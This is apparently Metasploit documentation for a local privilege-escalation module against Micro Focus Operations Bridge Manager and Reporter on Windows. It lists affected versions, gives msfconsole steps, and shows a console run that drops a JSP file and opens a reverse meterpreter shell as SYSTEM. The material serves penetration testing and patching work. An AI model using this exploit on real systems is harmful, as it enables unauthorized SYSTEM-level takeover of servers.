## Vulnerable Application

This module exploits an incorrectly permissioned folder in Micro Focus Operations Bridge Manager and Operations Bridge Reporter.

An unprivileged user (such as Guest) can drop a JSP file in an exploded WAR directory and then access it without authentication by making
a request to the OBM / OBR server.
This will result in automatic code execution as SYSTEM. This module has been tested on OBM 2020.05 and 2019.11,
but it should work out of the box on earlier versions too.

According to Micro Focus the vulnerable versions are:

* Operations Bridge Manager versions: 2020.05, 2019.11, 2019.05, 2018.11, 2018.05, versions 10.6x and 10.1x and older versions
* Operations Bridge (containerized) versions: 2019.11, 2019.08, 2019.05, 2018.11, 2018.08, 2018.05, 2018.02, 2017.11
* Operations Bridge Reporter versions: 10.40 and possibly earlier

Installation docs are available at:

* https://docs.microfocus.com/itom/Operations_Bridge_Manager:2020.05
* https://docs.microfocus.com/itom/Operations_Bridge_Reporter:10.40/Home

Vulnerable versions of the software can be downloaded from Micro Focus website by requesting a demo.

Only the Windows version of the product is affected.

All details about these vulnerabilities can be obtained from the advisory:

* https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBM.md
* https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md

## Verification Steps

1. Install the application
2. Start msfconsole
3. `use exploit/windows/local/microfocus_operations_privesc.rb`
4. `set target TARGET`
5. `set session SESSION`
6. `set lhost YOUR_IP`
7. `run`
8. You should get a shell.

## Scenarios

```
msf6 exploit(multi/handler) > use exploit/windows/local/microfocus_operations_privec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/microfocus_operations_privec) > set lhost 10.0.0.1
lhost => 10.0.0.1
msf6 exploit(windows/local/microfocus_operations_privec) > set lport 4499
lport => 4499
msf6 exploit(windows/local/microfocus_operations_privec) > set session 3
session => 3
msf6 exploit(windows/local/microfocus_operations_privec) > run

[*] Started reverse TCP handler on 10.0.0.1:4499
[*] JSP dropped, calling it @ https://127.0.0.1:443/topaz/LB_Verify.jsp
[*] Sending stage (175174 bytes) to 10.0.0.206
[*] Meterpreter session 4 opened (10.0.0.1:4499 -> 10.0.0.206:65068) at 2021-01-29 16:00:43 +0700

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
